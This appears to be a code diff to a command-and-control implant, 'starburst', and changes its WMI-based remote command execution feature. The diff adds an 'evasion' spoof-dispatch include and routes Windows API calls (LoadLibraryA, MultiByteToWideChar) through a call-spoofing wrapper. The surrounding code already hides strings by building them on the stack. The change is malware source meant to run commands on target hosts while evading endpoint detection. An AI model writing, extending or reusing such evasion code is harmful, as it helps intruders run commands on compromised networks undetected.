@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_WMIEXEC
 
@@ -88,8 +89,8 @@ auto declfn starburst::cmd_wmiexec(
 
     STK_OLE32(_n1);
     STK_OLEAUT32(_n2);
-    HMODULE h_ole32 = inst.kernel32.LoadLibraryA( _n1 );
-    HMODULE h_oleaut32 = inst.kernel32.LoadLibraryA( _n2 );
+    HMODULE h_ole32 = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n1 );
+    HMODULE h_oleaut32 = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n2 );
 
     if ( !h_ole32 || !h_oleaut32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
@@ -204,7 +205,7 @@ auto declfn starburst::cmd_wmiexec(
     wchar_t cmd_prefix[] = { 'c','m','d','.','e','x','e',' ','/','c',' ', 0 };
     int cidx = 0;
     for ( ; cmd_prefix[cidx]; cidx++ ) w_cmd[cidx] = cmd_prefix[cidx];
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, command_str, command_len, w_cmd + cidx, 2048 - cidx - 1 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, command_str, command_len, w_cmd + cidx, 2048 - cidx - 1 );
 
     typedef HRESULT (STDMETHODCALLTYPE *fnPut)( void*, BSTR, LONG, void*, LONG );
     auto pPut = reinterpret_cast<fnPut>( reinterpret_cast<void**>( pInInst->lpVtbl )[5] );
